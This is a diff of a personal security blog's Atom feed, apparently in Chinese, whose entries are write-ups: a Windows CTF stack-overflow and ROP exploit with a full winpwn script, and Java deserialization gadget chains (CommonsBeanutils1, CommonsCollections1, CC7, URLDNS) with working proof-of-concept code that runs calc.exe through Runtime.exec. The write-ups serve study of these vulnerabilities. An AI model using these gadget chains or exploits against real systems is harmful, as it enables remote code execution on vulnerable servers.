@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://limpid94.github.io</id>
     <title>Limpid</title>
-    <updated>2022-02-16T09:11:21.130Z</updated>
+    <updated>2022-09-14T09:48:42.569Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://limpid94.github.io"/>
     <link rel="self" href="https://limpid94.github.io/atom.xml"/>
@@ -11,393 +11,1606 @@
     <icon>https://limpid94.github.io/favicon.ico</icon>
     <rights>All rights reserved 2022, Limpid</rights>
     <entry>
-        <title type="html"><![CDATA[【Java反序列化】CommonCollections1利用链]]></title>
-        <id>https://limpid94.github.io/post/java-fan-xu-lie-hua-commoncollections1-li-yong-lian/</id>
-        <link href="https://limpid94.github.io/post/java-fan-xu-lie-hua-commoncollections1-li-yong-lian/">
+        <title type="html"><![CDATA[【WinPWN】栈溢出-ROP-babyROP]]></title>
+        <id>https://limpid94.github.io/post/winpwn-zhan-yi-chu-rop-babyrop/</id>
+        <link href="https://limpid94.github.io/post/winpwn-zhan-yi-chu-rop-babyrop/">
         </link>
-        <updated>2022-02-11T06:12:30.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="基础">基础</h2>
-<h3 id="transformer">Transformer</h3>
-<p>其为接口，只有一个<code>transform</code>接口，后续若被继承则需实现该接口。</p>
-<h3 id="constanttransformer">ConstantTransformer</h3>
-<p>该类继承了Transformer接口，并在<code>transform</code>方法中返回了由构造方法传入的类。</p>
-<pre><code class="language-java">public ConstantTransformer(Object constantToReturn) {
-        this.iConstant = constantToReturn;
-    }
+        <updated>2022-05-09T16:22:43.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="程序基本信息">程序基本信息</h2>
+<figure data-type="image" tabindex="1"><img src="https://limpid94.github.io/post-images/1652113838376.png" alt="" loading="lazy"></figure>
+<h2 id="反编译情况">反编译情况</h2>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  FILE *v3; // eax
+  int i; // esi
+  char v5; // al
+  FILE *v6; // eax
+  FILE *v7; // eax
+  int v8; // esi
+  int j; // ebx
+  char v10; // al
+  FILE *v11; // eax
+  char messages[100]; // [esp+Ch] [ebp-CCh] BYREF
+  char name[100]; // [esp+70h] [ebp-68h] BYREF
+  int messagelength; // [esp+D4h] [ebp-4h] BYREF
 
-public Object transform(Object input) {
-    return this.iConstant;
+  puts(&quot;input your name&quot;);
+  v3 = _iob_func();
+  fflush(v3 + 1);
+  for ( i = 0; i &lt; 100; ++i )
+  {
+    v5 = getchar();
+    if ( v5 == 10 )
+      break;
+    name[i] = v5;
+  }
+  printf(&quot;hello %s\n&quot;, name);
+  v6 = _iob_func();
+  fflush(v6 + 1);
+  puts(&quot;input your message length&quot;);
+  v7 = _iob_func();
+  fflush(v7 + 1);
+  scanf(&quot;%d\n&quot;, &amp;messagelength);
+  v8 = 0;
+  for ( j = messagelength; v8 &lt; j; messages[v8++] = v10 )
+  {
+    v10 = getchar();
+    if ( v10 == 10 )
+      break;
+  }
+  puts(&quot;leave your message&quot;);
+  printf(&quot;your mesage is %s\n&quot;, messages);
+  printf(&quot;press enter to exit\n&quot;);
+  v11 = _iob_func();
+  fflush(v11 + 1);
+  getchar();
+  return 0;
 }
 </code></pre>
-<h3 id="invokertransformer">InvokerTransformer</h3>
-<p>在<code>transform</code>中利用反射调用传入某个类的方法，而调用的方法和所需的参数则在构造函数中完成赋值。最终完成该方法的执行结果。</p>
-<h3 id="chainedtransformer">ChainedTransformer</h3>
-<p>该类通过循环的方式调用传入的transformers数组的transform方法，并将上一次的循环结果带入下一个循环中。</p>
-<h2 id="commonscollections1利用链的构造">CommonsCollections1利用链的构造</h2>
-<p>首先最关键的是危险方法的调用。在JAVA中执行系统命令的都是Runtime类，但是Runtime类没有继承Serializable类，无法进行 序列化操作。于是需要被反射调用。</p>
-<h3 id="构造过程">构造过程</h3>
-<p>首先看到InvokerTransformer，其transform方法代码如下</p>
-<pre><code class="language-java"> public Object transform(Object input) {
-        if (input == null) {
-            return null;
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>首先看到第一处</p>
+<pre><code class="language-c">  puts(&quot;input your name&quot;);
+  v3 = _iob_func();
+  fflush(v3 + 1);
+  for ( i = 0; i &lt; 100; ++i )
+  {
+    v5 = getchar();
+    if ( v5 == 10 )
+      break;
+    name[i] = v5;
+  }
+  printf(&quot;hello %s\n&quot;, name);
+</code></pre>
+<p>在输入name的时候输入长度为100，并且name的数组长度为<code>char name[100];</code>，这样并不会造成栈溢出，但是字符串的结尾应该是<code>\x00</code> ，因此当输入长度为100字符的时候就会将末尾的 <code>\x00</code> 抹去，于是在printf函数中会将后面的数据一起打印出来：<br>
+<img src="https://limpid94.github.io/post-images/1652114958081.png" alt="" loading="lazy"><br>
+通过X32DBG进行调试，发现内存布局如下：<br>
+<img src="https://limpid94.github.io/post-images/1652115168867.png" alt="" loading="lazy"><br>
+实际上内存中紧跟name字符串后面的是msvcr100.dll中的某个函数，因此可以通过当前地址-偏移量=dll文件的基址。而用调试器查看当前程序的内存布局可以获得当前msvcr100.dll的加载基址，于是就可以得知偏移量是多少。<br>
+<img src="https://limpid94.github.io/post-images/1652179735489.png" alt="" loading="lazy"><br>
+偏移量为<code>0x7120263d-0x711f0000=0x1263d</code>，从程序信息中得知程序开启了ASLR和DEP保护，也就是每次程序启动加载的地址不一样，但是偏移量不会变动，因此结合泄露的地址就能求出每次启动时msvcr100.dll的基址。</p>
+<p>再来看第二处：</p>
+<pre><code class="language-c"> puts(&quot;input your message length&quot;);
+  v7 = _iob_func();
+  fflush(v7 + 1);
+  scanf(&quot;%d\n&quot;, &amp;messagelength);
+  v8 = 0;
+  for ( j = messagelength; v8 &lt; j; messages[v8++] = v10 )
+  {
+    v10 = getchar();
+    if ( v10 == 10 )
+      break;
+  }
+</code></pre>
+<p>这里输入的长度可控，并且输入的内容长度可以超过messages数组的长度，因此存在栈溢出漏洞。<br>
+从IDA中得知messages距离ebp的长度：<br>
+<img src="https://limpid94.github.io/post-images/1652180304744.png" alt="" loading="lazy"><br>
+也就是填充<code>0xCC+4</code>字节长度就可以控制EIP从而劫持程序流。<br>
+现在DEP保护开启使得无法把shellcode填入栈中来执行，因此需要ROP来绕过这个保护。可以利用MANO脚本来查找ropchain，也可以尝试直接从msvcr100.dll中挖掘利用点。</p>
+<p>首先在msvcr100.dll中找到system函数：<br>
+<img src="https://limpid94.github.io/post-images/1652180651947.png" alt="" loading="lazy"><br>
+其偏移地址为:<br>
+<img src="https://limpid94.github.io/post-images/1652180946490.png" alt="" loading="lazy"></p>
+<p>然后还发现存在cmd.exe字符串，但是字符串并不能直接看出偏移地址，因此先用ida加载dll文件获取当前地址，再查看其镜像基地址：<br>
+<img src="https://limpid94.github.io/post-images/1652180726880.png" alt="" loading="lazy"><br>
+然后用exeinfoPE来查看基地址：<br>
+<img src="https://limpid94.github.io/post-images/1652181119674.png" alt="" loading="lazy"><br>
+二者相减得知偏移量：<code>0x78AE3030-0x87AA0000 = 0x43030</code>，于是可以编写EXP了。</p>
+<p>需要注意的是，发生栈溢出的栈空间属于main函数，因此需要先完成最后的那个回车才能触发：<br>
+<img src="https://limpid94.github.io/post-images/1652181420191.png" alt="" loading="lazy"></p>
+<h2 id="exp">EXP</h2>
+<pre><code class="language-python">#coding:utf-8
+
+from winpwn import *
+#context.log_level = 'debug'
+context.arch = 'i386'
+
+p = process(&quot;I:\\WinPwn\\execise\\BUUOJ\\BabyROP\\babyrop.exe&quot;)
+payload = &quot;A&quot; * 0x63 + &quot;@&quot;
+p.recvuntil(&quot;name&quot;)
+p.sendline(payload)
+p.recvuntil(&quot;@&quot;)
+
+# hex(0x7120263d-0x711f0000) = 0x1263d
+dll_base = u32(p.recv(4)) - 0x1263d
+print &quot;[+] MSVCR100.DLL Base Address:&quot;,dll_base
+
+system_offset = 0x62632
+cmd_offset = 0x43030
+system_addr = dll_base + system_offset
+cmd_addr =  dll_base + cmd_offset
+payload2 = 'A'*0xCC + 'BBBB' + p32(system_addr) + p32(0xdeadbeef) + p32(cmd_addr)
+p.recvuntil(&quot;input your message length&quot;)
+p.sendline(str(256))
+p.sendline(payload2)
+p.recvuntil(&quot;press enter to exit&quot;)
+p.sendline(&quot;&quot;)
+
+p.interactive()
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://limpid94.github.io/post-images/1652181635681.png" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[【Java反序列化】CommonBeanutils1利用链]]></title>
+        <id>https://limpid94.github.io/post/java-fan-xu-lie-hua-commonbeanutils1-li-yong-lian/</id>
+        <link href="https://limpid94.github.io/post/java-fan-xu-lie-hua-commonbeanutils1-li-yong-lian/">
+        </link>
+        <updated>2022-04-29T06:50:57.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
+<p>在尝试复现Shiro 550反序列化漏洞的时候发现用cc链不能正常攻击，而网上的一些文章却能正常用CC链进行复现。经过对比发现原始的Shiro环境下没有Common-Collections包，而网上能成功复现的博主大部分都是自己添加了CC包。于是思考在无CC包的情况下如何进行利用。当然已经有大牛给出了答案，使用CommonBeanutils包来构造反序列化链接。</p>
+<h2 id="调用链">调用链</h2>
+<pre><code class="language-text">PriorityQueue.readObject()
+	PriorityQueue.heapify()
+		PriorityQueue.siftDown()
+			siftDownUsingComparator()
+				BeanComparator.compare()
+					TemplatesImpl.getOutputProperties()
+						TemplatesImpl.newTransformer()
+							TemplatesImpl.getTransletInstance()
+								TemplatesImpl.defineTransletClasses()
+									TemplatesImpl.TransletClassLoader.defineClass()
+										Pwner*(Javassist-generated).&lt;static init&gt;
+											Runtime.exec()
+</code></pre>
+<h2 id="相关知识点">相关知识点</h2>
+<h3 id="commonbeanutils">CommonBeanutils</h3>
+<p>CommonBeanutils提供了一组便捷的动态操作JavaBean的API，代替复杂的反射模式。<br>
+其中值得关注的有<code>org.apache.commons.beanutils.BeanComparator</code> ，其实现了<code>Comparator</code>接口可以用来比较两个Bean属性的内容。<br>
+<img src="https://limpid94.github.io/post-images/1651219689079.png" alt="" loading="lazy"><br>
+查看其构造函数，一共有三个：</p>
+<pre><code class="language-java">    public BeanComparator() {
+        this( null );
+    }
+
+    public BeanComparator( String property ) {
+        this( property, ComparableComparator.getInstance() );
+    }
+
+    public BeanComparator( String property, Comparator comparator ) {
+        setProperty( property );
+        if (comparator != null) {
+            this.comparator = comparator;
+        } else {
+            this.comparator = ComparableComparator.getInstance();
         }
+    }
+</code></pre>
+<p>构造函数需要传入两个函数第二个函数若不传则默认调用<code>ComparableComparator</code>，其源于CommonsCollections。但如果传入了一个原生的<code>Comparator</code>则可以摆脱对CC包的依赖。<br>
+再看它的compare方法</p>
+<pre><code class="language-java">    public int compare( Object o1, Object o2 ) {
+        
+        if ( property == null ) {
+            // compare the actual objects
+            return comparator.compare( o1, o2 );
+        }
+        
         try {
-            Class cls = input.getClass();
-            Method method = cls.getMethod(iMethodName, iParamTypes);
-            return method.invoke(input, iArgs);
-                
-        } catch (NoSuchMethodException ex) {
-            throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' does not exist&quot;);
-        } catch (IllegalAccessException ex) {
-            throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' cannot be accessed&quot;);
-        } catch (InvocationTargetException ex) {
-            throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' threw an exception&quot;, ex);
+            Object value1 = PropertyUtils.getProperty( o1, property );
+            Object value2 = PropertyUtils.getProperty( o2, property );
+            return comparator.compare( value1, value2 );
         }
-</code></pre>
-<p>其主要的作用就是反射调用传入的方法，于是可以利用其调用Runtime达到命令执行的效果。（此处先不论Runtime无法序列化的问题）。</p>
-<pre><code class="language-java">package cc.commonscollections.test;
-
-import org.apache.commons.collections.functors.InvokerTransformer;
-
-public class Test {
-    public static void main(String[] args) {
-
-        Runtime r = Runtime.getRuntime();
-        new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;}).transform(r);
-    }
-}
-</code></pre>
-<p>然后查找哪里调用了该类的transform或者有同名方法的类：<br>
-<img src="https://limpid94.github.io/post-images/1644741115597.PNG" alt="" loading="lazy"><br>
-其中 org/apache/commons/collections/map/TransformedMap.java中的checkSetValue调用了关键方法：</p>
-<pre><code class="language-java">    protected Object checkSetValue(Object value) {
-        return valueTransformer.transform(value);
+        catch ( IllegalAccessException iae ) {
+            throw new RuntimeException( &quot;IllegalAccessException: &quot; + iae.toString() );
+        } 
+        catch ( InvocationTargetException ite ) {
+            throw new RuntimeException( &quot;InvocationTargetException: &quot; + ite.toString() );
+        }
+        catch ( NoSuchMethodException nsme ) {
+            throw new RuntimeException( &quot;NoSuchMethodException: &quot; + nsme.toString() );
+        } 
     }
 </code></pre>
-<p>继续查找哪里调用了checkSetValue，其中一个结果是org/apache/commons/collections/map/AbstractInputCheckedMapDecorator.java的setValue</p>
-<pre><code class="language-java">        public Object setValue(Object value) {
-            value = parent.checkSetValue(value);
-            return entry.setValue(value);
-        }
-</code></pre>
-<p>此处的setValue是属于AbstractInputCheckedMapDecorator类的静态类MapEntry：</p>
-<pre><code class="language-java">static class MapEntry extends AbstractMapEntryDecorator {
-
-        /** The parent map */
-        private final AbstractInputCheckedMapDecorator parent;
-
-        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
-            super(entry);
-            this.parent = parent;
-        }
-
-        public Object setValue(Object value) {
-            value = parent.checkSetValue(value);
-            return entry.setValue(value);
-        }
+<p>该方法会调用<code>PropertyUtils.getProperty()</code>来获取两个对象的<code>property</code>属性的值，然后调用<code>internalCompare()</code>方法调用实例化的<code>comparator</code> 的<code>compare</code> 方法进行比较。而<code>getProperty()</code>相当于获取传入的对象的指定属性的<code>getter/setter</code>方法。例如传入<code>User</code>和<code>name</code>，相当于调用 <code>User.getName()</code>。</p>
+<h2 id="反序列化利用链构造">反序列化利用链构造</h2>
+<p>这里用来触发恶意代码的TemplatesImpl的<code>newTransformer()</code>是被自身类中的<code>getOutputProperties()</code>所调用。<br>
+<img src="https://limpid94.github.io/post-images/1651404435994.png" alt="" loading="lazy"><br>
+之所以<code>getOutputProperties</code>方法是因为可以搭配<code>BeanComparator#compare()</code>，利用其中调用类的getter/setter方法的手段来调用<code>getOutputProperties</code>属性的值。<br>
+为了进一步触发<code>BeanComparator</code>类的<code>compare</code>方法，可考虑CC链中的<code>PriorityQueue</code>类。<br>
+<code>PriorityQueue</code>的调用过程在CC2反序列化的文章内有分析过，简单说就是<code>PriorityQueue#readObject()</code> 调用了<code>heapify()</code>，而在<code>heapify()</code>中为了遍历和排序元素，将其传入<code>siftDown()</code>中。如果<code>comparator</code>不为空的话会进入<code>siftDownUsingComparator()</code>中，</p>
+<pre><code class="language-java">    private void siftDown(int k, E x) {
+        if (comparator != null)
+            siftDownUsingComparator(k, x);
+        else
+            siftDownComparable(k, x);
     }
 </code></pre>
-<p>到此处需要理解一下TransformedMap是怎么调用到 AbstractInputCheckedMapDecorator的MapEntry的setValue。</p>
-<p>从代码得知，<code>TransformedMap</code>的<code>decorate</code>创建的该类的实例，并将<code>decorate</code>方法的参数<code>map</code>作为调用父类<code>AbstractInputCheckedMapDecorator</code>的构造函数时所传入的参数，并将<code>decorate</code>方法的第三个参数<code>valueTransformer</code>作为<code>this.valueTransformer</code>变量<br>
-于是需要有个Map.Entry的循环调用来进行触发：</p>
-<pre><code class="language-java">Runtime r = Runtime.getRuntime();
-InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;});
+<p>而在<code>siftDownUsingComparator()</code>中调用了<code>compare</code>方法，也就跟<code>BeanComparator</code>中的<code>compare</code>方法链接起来</p>
+<h2 id="poc">POC</h2>
+<pre><code class="language-java">package cc.commonbeanutils;
 
-HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();
-hashMap.put(&quot;123&quot;,&quot;456&quot;);
-
-Map transformedMap = TransformedMap.decorate(hashMap,null, invokerTransformer);
-for(Map.Entry entry:transformedMap.entrySet()){
-     entry.setValue(r);
- }
-</code></pre>
-<p><img src="https://limpid94.github.io/post-images/1644856931555.PNG" alt="" loading="lazy"><br>
-目前已经完成一半，接下来继续查找何处有类似的循环并且调用了setValue。<br>
-在<code>AnnotationInvocationHandler</code>中的<code>readObject</code>有类似的调用：</p>
-<pre><code class="language-java">    private void readObject(java.io.ObjectInputStream s)
-        throws java.io.IOException, ClassNotFoundException {
-        s.defaultReadObject();
-
-        // Check to make sure that types have not evolved incompatibly
-
-        AnnotationType annotationType = null;
-        try {
-            annotationType = AnnotationType.getInstance(type);
-        } catch(IllegalArgumentException e) {
-            // Class is no longer an annotation type; time to punch out
-            throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);
-        }
-</code></pre>
-<p>但是这个类不是public的，无法直接调用，需要用反射直接加载<br>
-<img src="https://limpid94.github.io/post-images/1644993923128.PNG" alt="" loading="lazy"></p>
-<pre><code class="language-java">Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
-</code></pre>
-<p>然后根据类来实例化构造函数</p>
-<pre><code class="language-java">Constructor constructor =  c.getDeclaredConstructor(Class.class, Map.class);
-constructor.setAccessible(true);
-InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class,transformedMap);
-</code></pre>
-<p>值得注意的是，此处的Target注解是因为注解中含有一个ElementType的值</p>
-<pre><code class="language-java">public @interface Target {
-    /**
-     * Returns an array of the kinds of elements an annotation type
-     * can be applied to.
-     * @return an array of the kinds of elements an annotation type
-     * can be applied to
-     */
-    ElementType[] value();
-}
-</code></pre>
-<p>这样在AnnotationInvocationHandler的readObject中才能顺利通过<code>if (memberType != null)</code> 进而执行到<code>memberValue.setValue()</code>。<br>
-<img src="https://limpid94.github.io/post-images/1644997316542.PNG" alt="" loading="lazy"><br>
-若换成<code>Overwirte</code>注解则会失败，原因在于其没有任何值。<br>
-<img src="https://limpid94.github.io/post-images/1644998716000.PNG" alt="" loading="lazy"><br>
-当然到此处依然还没结束，因为Runtime不能被序列化的问题还没解决。</p>
-<h3 id="构造可以被序列化的runtime类">构造可以被序列化的Runtime类</h3>
-<p>在Java中利用反射调有以下三种方式<br>
-1、类名.class</p>
-<pre><code class="language-java">    Runtime.class
-</code></pre>
-<p>2、实例名.getClass</p>
-<pre><code class="language-java">    Runtime runtime = new Runtime();
-    runtime.getClass;
-</code></pre>
-<p>3、通过类的完整路径获取</p>
-<pre><code class="language-java">    Class.forName(&quot;.......&quot;);
-</code></pre>
-<p>第二种显然没办法将Runtime进行序列化，但是第一种实际上是生成一个Class类，而Class类是可以被序列化的<br>
-<img src="https://limpid94.github.io/post-images/1644999039435.PNG" alt="" loading="lazy"><br>
-于是这里使用ConstantTransformer+InvokerTransformer来组成反射调用的链：</p>
-<pre><code class="language-java">        //相当于Runtime.getRuntime().exec(&quot;calc&quot;);
-        Transformer[] transformer = new Transformer[]{
-                //用反射的方法调用Runtime对象
-                new ConstantTransformer(Runtime.class),
-                //用反射中的getMethod方法来获取Method对象
-                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class}, new Object[]{&quot;getRuntime&quot;,null}),
-                //用invoke执行getRuntime
-                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
-                //调用exec方法并传入要执行的命令
-                new InvokerTransformer(&quot;exec&quot;,
-                        new Class[]{String.class},
-                        new Object[]{&quot;calc.exe&quot;}
-                        )
-        };
-</code></pre>
-<p>然后使用ChainedTransformer将上述链串起来，并方便TransformedMap.decorate调用。<br>
-##完整调用</p>
-<pre><code class="language-java">package cc.commonscollections;
-
-import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.map.TransformedMap;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtConstructor;
+import org.apache.commons.beanutils.BeanComparator;
 
 import java.io.*;
-//import java.lang.annotation.Target;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.InvocationTargetException;
-import java.util.HashMap;
-import java.util.Map;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
 
-public class CommonCollections1Demo {
-    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
-        Transformer[] transformer = new Transformer[]{
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class}, new Object[]{&quot;getRuntime&quot;,null}),
-                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
-                new InvokerTransformer(&quot;exec&quot;,
-                        new Class[]{String.class},
-                        new Object[]{&quot;calc.exe&quot;}
-                        )
-        };
+public class CommonBeanutils1 {
+    public static void main(String[] args) throws Exception {
+        //获取默认类池
+        ClassPool pool = ClassPool.getDefault();
+        //添加路径
+        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        //创建新类
+        CtClass evil = pool.makeClass(&quot;Evil&quot;);
+        //设置类名
+        evil.setName(&quot;MyEvil&quot;);
+        //设置要继承的类
+        evil.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+        //创建空的构造函数
+        CtConstructor newconstructor = evil.makeClassInitializer();
+        //将字节码插入开头
+        newconstructor.insertBefore(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;);
+        evil.writeFile();
 
-        Transformer ctf = new ChainedTransformer(transformer);
-        Map map1 = new HashMap();
-        map1.put(&quot;value&quot;,&quot;123&quot;);
-        Map map2 = TransformedMap.decorate(map1,null,ctf);
+        byte[] bytecode = evil.toBytecode();
+        byte[][] bytecodes = {bytecode};
 
-        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
-        //获取构造函数
-        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
-        constructor.setAccessible(true);
-        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class,map2);
-//        mySeriable(invocationHandler);
-        myDeseriable();
+        TemplatesImpl templates = new TemplatesImpl();
+        Class templatesClass = templates.getClass();
+        Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaa&quot;);
+
+        Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        bytecodesField.set(templates,bytecodes);
+
+        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+        //++++++++++++++++++++++++++++++++代码执行部分结束+++++++++++++++++++++++++++++++++++++
+
+        BeanComparator beanComparator = new BeanComparator();
+        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, beanComparator);
+        queue.add(&quot;1&quot;);
+        queue.add(&quot;2&quot;);
+
+        Field propertyField = beanComparator.getClass().getDeclaredField(&quot;property&quot;);
+        propertyField.setAccessible(true);
+        propertyField.set(beanComparator,&quot;outputProperties&quot;);
+
+        Field queueField = queue.getClass().getDeclaredField(&quot;queue&quot;);
+        queueField.setAccessible(true);
+        queueField.set(queue, new Object[]{templates,templates});
+
+        Field comparatorField = beanComparator.getClass().getDeclaredField(&quot;comparator&quot;);
+        comparatorField.setAccessible(true);
+        comparatorField.set(beanComparator,String.CASE_INSENSITIVE_ORDER);
+
+
+//        mySeriable(queue);
+        myDeseriable(&quot;seccb1.bin&quot;);
 
     }
-
     public static void mySeriable(Object obj) throws IOException {
-        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;seccb1.bin&quot;));
         oos.writeObject(obj);
+        oos.close();
     }
 
-    public static Object myDeseriable() throws IOException, ClassNotFoundException {
-        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));
+    public static Object myDeseriable(String s) throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(s));
         return ois.readObject();
     }
 }
 
 </code></pre>
 <h2 id="参考材料">参考材料</h2>
-<p>[1] http://drops.xmd5.com/static/drops/papers-13244.html<br>
-[2] https://zhuanlan.zhihu.com/p/350058223<br>
-[3] https://www.freebuf.com/articles/web/312175.html<br>
-[4] http://121.40.251.109/2021/07/16/2021-7-16-ysoserial%E7%B3%BB%E5%88%97-CommonsCollections1%E9%93%BE%E5%88%86%E6%9E%90/</p>
+<p>https://www.cnblogs.com/9eek/p/15123125.html<br>
+https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html<br>
+https://blog.weik1.top/2021/01/18/CommonsBeanutils%E9%93%BE%E5%88%86%E6%9E%90/<br>
+https://www.cnblogs.com/zpchcbd/p/14957034.html<br>
+https://su18.org/post/ysoserial-su18-3/#beancomparator</p>
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[【JAVA反序列化】URLDNS利用链]]></title>
-        <id>https://limpid94.github.io/post/java-fan-xu-lie-hua-dui-urldns-de-xue-xi/</id>
-        <link href="https://limpid94.github.io/post/java-fan-xu-lie-hua-dui-urldns-de-xue-xi/">
+        <title type="html"><![CDATA[【Java反序列化】CommonCollections7利用链]]></title>
+        <id>https://limpid94.github.io/post/java-fan-xu-lie-hua-commoncollections7-li-yong-lian/</id>
+        <link href="https://limpid94.github.io/post/java-fan-xu-lie-hua-commoncollections7-li-yong-lian/">
         </link>
-        <updated>2022-02-07T04:36:42.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="java反序列化漏洞存在的形式">Java反序列化漏洞存在的形式</h2>
-<p>1、入口类的readObject存在危险方法调用行为。（A类中直接存在危险方法）<br>
-2、入口类的readObject使用的参数包含可控类，可控类存在危险方法。（A类中间接调用危险方法）<br>
-3、入口类的readObject调用了可控类，而该类又调用了其他的危险方法类。（A类中调用B类，B类又调用其他危险方法）<br>
-4、构造函数/静态代码块等加载时隐式执行。</p>
-<h2 id="java反序列化利用链的查找思路">JAVA反序列化利用链的查找思路</h2>
-<p>首先查找的类必须继承Serializable，其次在查找入口类时需要满足重写readObject、参数类型宽泛和所查找的类最好来自于JDK。</p>
-<h2 id="urldns">URLDNS</h2>
-<h3 id="urldns如何触发dns请求原理">URLDNS如何触发DNS请求原理</h3>
-<p>通过查找资料，得知该调用链的调用情况如下：</p>
-<pre><code> *   Gadget Chain:
- *     HashMap.readObject()
- *       HashMap.putVal()
- *         HashMap.hash()
- *           URL.hashCode()
+        <updated>2022-04-08T09:53:02.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="调用链">调用链</h2>
+<pre><code>    java.util.Hashtable.readObject
+    java.util.Hashtable.reconstitutionPut
+    org.apache.commons.collections.map.AbstractMapDecorator.equals
+    java.util.AbstractMap.equals
+    org.apache.commons.collections.map.LazyMap.get
+    org.apache.commons.collections.functors.ChainedTransformer.transform
+    org.apache.commons.collections.functors.InvokerTransformer.transform
+    java.lang.reflect.Method.invoke
+    sun.reflect.DelegatingMethodAccessorImpl.invoke
+    sun.reflect.NativeMethodAccessorImpl.invoke
+    sun.reflect.NativeMethodAccessorImpl.invoke0
+    java.lang.Runtime.exec
 </code></pre>
-<p>在<code>URL.hashCode()</code>中调用了<code>handler.hashCode()</code></p>
-<pre><code class="language-java">    public synchronized int hashCode() {
-        if (hashCode != -1)
-            return hashCode;
+<h2 id="差异点分析">差异点分析</h2>
+<p>CC1、3、5、6都用都到了<code>LazyMap</code>的<code>get</code>作为命令执行的入口点，CC7同样采用<code>LazyMap</code>的<code>get()</code>但是有别于之前的触发方法。</p>
+<h3 id="hashtable">Hashtable</h3>
+<p>该条反序列化的入口点是<code>readObject()</code></p>
+<pre><code class="language-java">    private void readObject(java.io.ObjectInputStream s)
+         throws IOException, ClassNotFoundException
+    {
+        // Read in the length, threshold, and loadfactor
+        s.defaultReadObject();
 
-        hashCode = handler.hashCode(this);
-        return hashCode;
+        // Read the original length of the array and number of elements
+        int origlength = s.readInt();
+        int elements = s.readInt();
+
+        // Compute new size with a bit of room 5% to grow but
+        // no larger than the original size.  Make the length
+        // odd if it's large enough, this helps distribute the entries.
+        // Guard against the length ending up zero, that's not valid.
+        int length = (int)(elements * loadFactor) + (elements / 20) + 3;
+        if (length &gt; elements &amp;&amp; (length &amp; 1) == 0)
+            length--;
+        if (origlength &gt; 0 &amp;&amp; length &gt; origlength)
+            length = origlength;
+        table = new Entry&lt;?,?&gt;[length];
+        threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
+        count = 0;
+
+        // Read the number of elements and then all the key/value objects
+        for (; elements &gt; 0; elements--) {
+            @SuppressWarnings(&quot;unchecked&quot;)
+                K key = (K)s.readObject();
+            @SuppressWarnings(&quot;unchecked&quot;)
+                V value = (V)s.readObject();
+            // synch could be eliminated for performance
+            reconstitutionPut(table, key, value);
+        }
     }
 </code></pre>
